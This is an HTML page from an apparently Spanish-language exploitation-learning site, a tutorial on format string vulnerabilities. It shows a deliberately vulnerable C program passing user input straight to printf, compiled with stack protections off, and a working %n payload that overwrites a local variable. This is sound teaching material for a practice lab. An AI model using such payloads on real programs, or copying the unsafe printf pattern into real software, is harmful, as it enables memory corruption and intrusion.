@@ -1,1 +1,165 @@
 
+
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="css/al_zo_ex.css">
+
+ 
+	<title>Tutorial format string 2</title>
+</head>
+<body>
+
+<header>
+
+  <nav class="navbar navbar-expand-md navbar-light shadow-5-strong">
+      <div class="container-fluid">
+        <a class="navbar-brand text-primary" href="secur-home.html">learn@hacks#</a>
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#submenus" aria-controls="submenus" aria-expanded="false" arial-label="Toggler navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse justify-content-md-center" id="submenus">
+          <ul class="navbar-nav">
+            
+            <li class="nav-item active"><a class="nav-link text-primary" href="secur-home.html">Inicio</a></li>
+            <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle text-primary" href="#" data-bs-toggle="dropdown">Exploit Education</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofExEducation.html">Phoenix</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofNbEducation.html">Nebula</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofFsEducation.html">Fusion</a></li>
+                </ul>
+            </li>
+
+            <li class="nav-item dropdown">
+          <a class="nav-link dropdown-toggle text-primary" data-bs-toggle="dropdown" href="#">CTFs</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofVlhub.html">Vulnhub</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="picoFlags.html">picoCTF</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="RPISEC_MBE.html">RPISEC</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="pwnable_kr.html">pwnable</a></li>
+        </ul>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="shlpage.html">Shellcodes</a>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="tutoriales.html">Tutoriales</a>
+            </li> 
+
+            <li class="nav-item">
+              <a class="nav-link text-primary nav-link-color" href="https://github.com/BGPavelAng">Github</a>
+            </li>
+
+            <li>
+              <a class="nav-link text-primary nav-link-color" href="https://www.patreon.com/BGPavelAng">Patreon</a>
+            </li>
+
+          </ul>
+        </div>
+    </div>
+  </nav>
+</header>
+
+<div class="container-fluid">
+    <div class="row">
+      <div class="col">
+        <div class="img-bran d-none d-md-none d-lg-block">
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container mt-5">
+    <div class="row mt-5">
+      <div class="col">
+
+            <p>Vulnerabilidad Format String 2.</p>
+
+ <pre class="brush: cpp; title: ; notranslate" title=""><b>
+    %x	Hexadecimal<br>
+    %s	Cadena de caracteres<br>
+    %p	Puntero a direcciones<br>
+    %d	Integer<br>
+    %u	Unsigned Integer<br>
+    %o	Octal<br>
+    %f	Flotante<br>
+    %c	Caracter<br>
+    n	imprimir<br></b></pre> <br>
+
+<p>Vamos a compilar este código sin algunas protecciones</p>
+
+
+<pre class="brush: cpp; title: ; notranslate" title=""><b>
+
+
+        void vuln()<br>
+        {<br>
+          int acceso = 1;<br>
+          char buffer[64];<br>
+        
+          fgets(buffer, sizeof(buffer), stdin);<br>
+          printf(buffer);<br>
+        
+          if(acceso == 32) {<br>
+              printf(" lograste la vulnerabilidad de format string\n");<br>
+          }<br>
+        }<br>
+        
+        int main(int argc, char **argv)<br>
+        {<br>
+          vuln();<br>
+        }<br><br>
+    
+    gcc -m32 -z execstack -z norelro -fno-stack-protector -o formato2 formato2.c<br></b></pre>
+
+<p>Otro ejemplo igual, pero solo vamos a agregar un integer, es más sencillo pero es otra forma de practicar lo aprendido.</p>
+
+<p>Vamos a colocar las tres formas de descubrir donde esta guardada la variable <b>0x1 de “acceso”</b>.</p>
+
+<img class="img-fluid" src="img/formatstr1_2.png"><br><br>
+<img class="img-fluid" src="img/formatstr2_2.png"><br><br>
+<img class="img-fluid" src="img/formatstr3_2.png"><br><br>
+<img class="img-fluid" src="img/formatstr4_2.png"><br><br>
+
+<p>Ya tenemos muy confirmado donde está guardado el valor 1 = “0xffffd23c”</p> 
+
+<p>Ahora es buscar si es vulnerable el printf, vamos a repetir proceso.</p>
+
+<img class="img-fluid" src="img/formatstr5_2.png"><br><br>
+<img class="img-fluid" src="img/formatstr6_2.png"><br><br>
+
+<p>Vamos a poner un break en printf y después para ver como cambia el valor.</p>
+
+<img class="img-fluid" src="img/formatstr7_2.png"><br><br>
+
+<p>Listo. Valor cambiado, ahora ¿qué paso sigue?, pues colocar el integer que pide que es 32, recordemos que es 32 - 4 = 28, porque (\x3c\xd2\xff\xff ← (a estos 4 me refiero)) = 28.</p>
+
+<p><b>$(python2 -c 'print "\x3c\xd2\xff\xff%28x%7$n"')</b></p>
+
+<img class="img-fluid" src="img/formatstr8_2.png"><br><br>
+
+<p>Se logró el objetivo de encontrar la vulnerabilidad del formato 2.</p>
+
+
+      </div>
+
+    </div>
+  </div>
+
+  <footer class="footer mt-auto py-3 bg-light">
+  <div class="container">
+    <span class="text-muted">Aprende algo nuevo todos los días. Good luck!</span>
+  </div>
+</footer>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+</body>
+</html>
+      
